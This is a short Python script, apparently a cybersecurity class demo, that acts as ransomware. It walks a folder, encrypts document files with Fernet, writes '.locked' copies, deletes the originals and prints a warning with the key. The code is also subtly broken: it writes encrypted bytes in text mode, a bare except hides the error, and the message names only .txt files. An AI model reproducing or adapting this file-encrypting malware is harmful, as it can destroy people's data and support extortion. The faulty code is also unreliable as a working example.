import os
from cryptography.fernet import Fernet

#generar clave
key = Fernet.generate_key()
cipher = Fernet(key)
#guardar clave en un archivo

for root, _, files in os.walk("C:\\CIBERSEGURIDAD"):
    for file in files:
        if file.endswith((".txt", ".docx", ".xlsx", ".pdf")):
            file_path = os.path.join(root, file)

            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)

                with open(file_path + '.locked', 'w') as f:
                    f.write(encrypted)

                os.remove(file_path)
            except:
                pass


print(f"\n[!] Todos los archivos .txt han sido cifrados. Para descifrarlos, necesitarás la clave de cifrado.")
print(f"\n[+]  Clave de cifrado: {key.decode()}")


